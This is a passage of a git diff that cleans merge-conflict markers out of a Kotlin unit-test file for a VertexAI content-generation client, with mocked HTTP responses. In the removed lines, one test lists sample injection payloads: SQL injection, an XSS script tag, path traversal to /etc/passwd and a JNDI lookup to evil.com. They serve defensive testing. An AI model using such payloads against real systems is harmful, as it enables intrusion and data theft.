-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("Complete response", result)
-    }
-
-    @Test
-    @DisplayName("Should handle response with citation metadata")
-    fun `should handle response with citation metadata`() = runTest {
-        val prompt = "Test prompt"
-        val responseWithCitations = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns responseWithFinishReason
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1682,7 +1105,6 @@ inner class ResponseContentVariationTests {
         fun `should handle response with citation metadata`() = runTest {
             val prompt = "Test prompt"
             val responseWithCitations = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1707,26 +1129,6 @@ inner class ResponseContentVariationTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns responseWithCitations
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("Response with citations", result)
-    }
-
-    @Test
-    @DisplayName("Should handle response with blocked content")
-    fun `should handle response with blocked content`() = runTest {
-        val prompt = "Test prompt"
-        val blockedResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns responseWithCitations
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1740,7 +1142,6 @@ inner class ResponseContentVariationTests {
         fun `should handle response with blocked content`() = runTest {
             val prompt = "Test prompt"
             val blockedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1756,26 +1157,6 @@ inner class ResponseContentVariationTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns blockedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("", result)
-    }
-
-    @Test
-    @DisplayName("Should handle response with usage metadata")
-    fun `should handle response with usage metadata`() = runTest {
-        val prompt = "Test prompt"
-        val responseWithUsage = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns blockedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1789,7 +1170,6 @@ inner class ResponseContentVariationTests {
         fun `should handle response with usage metadata`() = runTest {
             val prompt = "Test prompt"
             val responseWithUsage = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1810,32 +1190,6 @@ inner class ResponseContentVariationTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns responseWithUsage
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("Response with usage info", result)
-    }
-}
-
-@Nested
-@DisplayName("Concurrency and Threading Tests")
-inner class ConcurrencyTests {
-
-    @Test
-    @DisplayName("Should handle multiple concurrent requests with different prompts")
-    fun `should handle multiple concurrent requests with different prompts`() = runTest {
-        val prompts = (1..5).map { "Test prompt $it" }
-        val responses = prompts.map { prompt ->
-            """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns responseWithUsage
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -1855,7 +1209,6 @@ inner class ConcurrencyTests {
             val prompts = (1..5).map { "Test prompt $it" }
             val responses = prompts.map { prompt ->
                 """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1870,56 +1223,6 @@ inner class ConcurrencyTests {
                     ]
                 }
                 """.trimIndent()
-<<<<<<< HEAD
-        }
-
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returnsMany responses
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val results = prompts.map { prompt ->
-            vertexAIClient.generateContent(prompt, validModel)
-        }
-
-        results.forEachIndexed { index, result ->
-            assertTrue(result.contains("Response to Test prompt ${index + 1}"))
-        }
-        coVerify(exactly = prompts.size) {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle thread interruption gracefully")
-    fun `should handle thread interruption gracefully`() = runTest {
-        val prompt = "Test prompt"
-
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } throws InterruptedException("Thread interrupted")
-
-        assertThrows<InterruptedException> {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle client state consistency across requests")
-    fun `should handle client state consistency across requests`() = runTest {
-        val prompt = "Test prompt"
-        val expectedResponse = """
-=======
             }
 
             every { mockResponse.statusCode() } returns 200
@@ -1953,7 +1256,6 @@ inner class ConcurrencyTests {
         fun `should handle client state consistency across requests`() = runTest {
             val prompt = "Test prompt"
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -1969,41 +1271,6 @@ inner class ConcurrencyTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns expectedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        // Make multiple requests to ensure state consistency
-        repeat(3) {
-            val result = vertexAIClient.generateContent(prompt, validModel)
-            assertEquals("Consistent response", result)
-        }
-
-        coVerify(exactly = 3) {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        }
-    }
-}
-
-@Nested
-@DisplayName("Boundary Value Tests")
-inner class BoundaryValueTests {
-
-    @Test
-    @DisplayName("Should handle single character prompt")
-    fun `should handle single character prompt`() = runTest {
-        val prompt = "a"
-        val expectedResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2027,7 +1294,6 @@ inner class BoundaryValueTests {
         fun `should handle single character prompt`() = runTest {
             val prompt = "a"
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2043,26 +1309,6 @@ inner class BoundaryValueTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns expectedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("Single char response", result)
-    }
-
-    @Test
-    @DisplayName("Should handle maximum theoretical prompt length")
-    fun `should handle maximum theoretical prompt length`() = runTest {
-        val maxPrompt = "x".repeat(1000000) // 1MB prompt
-        val expectedResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2076,7 +1322,6 @@ inner class BoundaryValueTests {
         fun `should handle maximum theoretical prompt length`() = runTest {
             val maxPrompt = "x".repeat(1000000) // 1MB prompt
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2092,45 +1337,6 @@ inner class BoundaryValueTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns expectedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(maxPrompt, validModel)
-        assertEquals("Max length response", result)
-    }
-
-    @Test
-    @DisplayName("Should handle empty JSON response")
-    fun `should handle empty JSON response`() = runTest {
-        val prompt = "Test prompt"
-        val emptyJson = "{}"
-
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns emptyJson
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("", result)
-    }
-
-    @Test
-    @DisplayName("Should handle response with deeply nested JSON")
-    fun `should handle response with deeply nested JSON`() = runTest {
-        val prompt = "Test prompt"
-        val deeplyNestedResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2158,7 +1364,6 @@ inner class BoundaryValueTests {
         fun `should handle response with deeply nested JSON`() = runTest {
             val prompt = "Test prompt"
             val deeplyNestedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2183,54 +1388,6 @@ inner class BoundaryValueTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns deeplyNestedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        val result = vertexAIClient.generateContent(prompt, validModel)
-        assertEquals("Nested response", result)
-    }
-}
-
-@Nested
-@DisplayName("Security and Privacy Tests")
-inner class SecurityTests {
-
-    @Test
-    @DisplayName("Should not log sensitive information in exceptions")
-    fun `should not log sensitive information in exceptions`() = runTest {
-        val prompt = "Test prompt"
-        val sensitiveApiKey = "secret-api-key-12345"
-        val secureClient =
-            VertexAIClientImpl(httpClient, sensitiveApiKey, validProjectId, validLocation)
-
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } throws RuntimeException("Test exception")
-
-        val exception = assertThrows<RuntimeException> {
-            runBlocking { secureClient.generateContent(prompt, validModel) }
-        }
-
-        // Verify that sensitive information is not exposed in the exception message
-        assertFalse(exception.message?.contains(sensitiveApiKey) == true)
-    }
-
-    @Test
-    @DisplayName("Should handle API key with special characters")
-    fun `should handle API key with special characters`() = runTest {
-        val specialApiKey = "key-with-special-chars-!@#$%^&*()"
-        val expectedResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns deeplyNestedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2266,7 +1423,6 @@ inner class SecurityTests {
         fun `should handle API key with special characters`() = runTest {
             val specialApiKey = "key-with-special-chars-!@#$%^&*()"
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2282,38 +1438,6 @@ inner class SecurityTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        assertDoesNotThrow {
-            val specialClient =
-                VertexAIClientImpl(httpClient, specialApiKey, validProjectId, validLocation)
-
-            every { mockResponse.statusCode() } returns 200
-            every { mockResponse.body() } returns expectedResponse
-            coEvery {
-                httpClient.send(
-                    any<HttpRequest>(),
-                    any<HttpResponse.BodyHandler<String>>()
-                )
-            } returns mockResponse
-
-            runBlocking { specialClient.generateContent("Test prompt", validModel) }
-        }
-    }
-
-    @Test
-    @DisplayName("Should handle malicious input injection attempts")
-    fun `should handle malicious input injection attempts`() = runTest {
-        val maliciousPrompts = listOf(
-            "'; DROP TABLE users; --",
-            "<script>alert('xss')</script>",
-            "../../etc/passwd",
-            "\${jndi:ldap://evil.com/a}",
-            "{{7*7}}",
-            "\u0000\u0001\u0002"
-        )
-
-        val expectedResponse = """
-=======
             assertDoesNotThrow {
                 val specialClient = VertexAIClientImpl(httpClient, specialApiKey, validProjectId, validLocation)
                 
@@ -2338,7 +1462,6 @@ inner class SecurityTests {
             )
 
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2354,34 +1477,6 @@ inner class SecurityTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns expectedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        maliciousPrompts.forEach { maliciousPrompt ->
-            assertDoesNotThrow {
-                runBlocking { vertexAIClient.generateContent(maliciousPrompt, validModel) }
-            }
-        }
-    }
-}
-
-@Nested
-@DisplayName("Resource Management Tests")
-inner class ResourceManagementTests {
-
-    @Test
-    @DisplayName("Should handle resource cleanup on client disposal")
-    fun `should handle resource cleanup on client disposal`() = runTest {
-        val prompt = "Test prompt"
-        val expectedResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2403,7 +1498,6 @@ inner class ResourceManagementTests {
         fun `should handle resource cleanup on client disposal`() = runTest {
             val prompt = "Test prompt"
             val expectedResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2419,33 +1513,6 @@ inner class ResourceManagementTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns expectedResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        // Create a new client instance for cleanup testing
-        val disposableClient =
-            VertexAIClientImpl(httpClient, validApiKey, validProjectId, validLocation)
-
-        val result = disposableClient.generateContent(prompt, validModel)
-        assertEquals("Cleanup test response", result)
-
-        // Verify the client can be used normally
-        coVerify { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
-    }
-
-    @Test
-    @DisplayName("Should handle memory pressure scenarios")
-    fun `should handle memory pressure scenarios`() = runTest {
-        val prompt = "Test prompt"
-        val largeResponse = """
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns expectedResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2465,7 +1532,6 @@ inner class ResourceManagementTests {
         fun `should handle memory pressure scenarios`() = runTest {
             val prompt = "Test prompt"
             val largeResponse = """
->>>>>>> origin/coderabbitai/docstrings/78f34ad
                 {
                     "candidates": [
                         {
@@ -2481,22 +1547,6 @@ inner class ResourceManagementTests {
                 }
             """.trimIndent()
 
-<<<<<<< HEAD
-        every { mockResponse.statusCode() } returns 200
-        every { mockResponse.body() } returns largeResponse
-        coEvery {
-            httpClient.send(
-                any<HttpRequest>(),
-                any<HttpResponse.BodyHandler<String>>()
-            )
-        } returns mockResponse
-
-        assertDoesNotThrow {
-            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
-        }
-    }
-}
-=======
             every { mockResponse.statusCode() } returns 200
             every { mockResponse.body() } returns largeResponse
             coEvery { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) } returns mockResponse
@@ -2506,5 +1556,4 @@ inner class ResourceManagementTests {
             }
         }
     }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
 }
